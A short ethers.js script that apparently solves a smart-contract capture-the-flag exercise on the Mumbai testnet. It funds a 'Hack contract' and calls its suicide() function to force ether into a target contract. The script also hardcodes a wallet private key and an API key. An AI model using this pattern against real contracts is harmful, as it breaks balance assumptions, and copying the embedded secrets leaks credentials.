let { ethers } = require('ethers');

let ABI = require('./ABI.json');
let PRIVATE_KEY = "821bb94aa24de0c3ff6ef682a846f522f36dcba12b8a5de819811bcb592f43ea";
let network = "https://polygon-mumbai.g.alchemy.com/v2/BigcFnXEKcriMiJUtLFLBAk_TRjyrfic";
let Contract_address = "0xb860e46B3d24124Bffb99cB5AE5ccf6FCc9f1252";                      // Hack contract

  
let provider = new ethers.providers.JsonRpcProvider(network);                          // read from blockchain
let signer = new ethers.Wallet(PRIVATE_KEY, provider);                                //  write on blockchain
let i = new ethers.Contract(Contract_address,ABI,signer);                            // contract_instance

let a = async()=>
{
    // calling receive/fallback function 
    let tx_1 = await signer.sendTransaction(                                     // await guarantees that the transaction has been broadcast to the network and is pending.
    {
        to: Contract_address,
        value: ethers.utils.parseEther('0.000000000000000001'),               // Amount of ETH to send
        gasLimit: 3000000                                                    // Adjust as needed
    });

    let receipt = await tx_1.wait();                                      // to avoid Double spending : check tx status pending -> successfull
    let tx_2 = i.suicide("0x29Bec12404a3eb6d103807A0e1168F1a719F2d93");  //  Force contract

}
a().catch((error) => 
{
    console.log("Error aagya ===")
    console.error(error);
});



